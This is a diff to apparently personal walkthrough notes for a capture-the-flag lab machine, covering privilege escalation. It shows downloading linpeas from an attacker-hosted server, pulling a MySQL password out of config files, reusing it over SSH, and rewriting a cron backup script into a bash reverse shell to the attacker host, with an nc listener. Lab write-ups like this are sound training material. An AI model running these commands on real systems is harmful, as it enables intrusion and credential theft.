@@ -209,6 +209,19 @@ gobuster dir -u http://192.168.64.134 -w /usr/share/wordlists/rockyou.txt
     5 on separate terminal set stty raw -echo | to allow reverse shell to behave more like a normal terminal | stty sane on normal terminal to break out and reset.
     6 cat /etc/passwd file to view the users on server to enumerate if we can possbily access any. Noted Grimmie had an executable script.
     7 cat grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash - Provided what seemed to be a backups file that removed itself
-    8 in this step we should attempt to look at cronjobs [need to work on this part more]
-    9 
-
+    8 attempted escalate priviliges locally such as "sudo, sudo su, su -" with no success. attempted to write new files with no success. atetmpted to download files with no success.
+    9 further Post Exploitation enumeration, on attacking machine download linpeas.sh. host python -m http webserver, and wget linpeas.sh file from victim machine. wget http://192.168.64.129:8000/linpeas.sh
+    10 run ./linpeas.sh > output.txt and view findings.
+    11 findings: Admin account, MySQL, MySQL password: 
+        /var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
+        /var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
+    12 At this point we attempt to ssh into victim machine to see if there has been password reuse, knowing that grimmie is likely an admin account. ssh grimmie@192.168.64.134 | password:"My_V3ryS3cur3_P4ss"
+    13 in this step we should attempt to look at cronjobs [need to work on this part more] | such as downloading pspy on attacker machine and wget to execute pspy on victim machine.
+    14 Since we have succesfully logged into grimmie's admin account, we can now nano the backup.sh file to perform another reverse shell to our attacker machine listening on port 3333. 
+    
+        #!/bin/bash
+    
+        bash -i >& /dev/tcp/192.168.64.129/3333 0>&1
+        
+    nc -nlvp 3333 on attacker machine
+     15 connection succesful, cat flag.txt. We have now captured the flag.
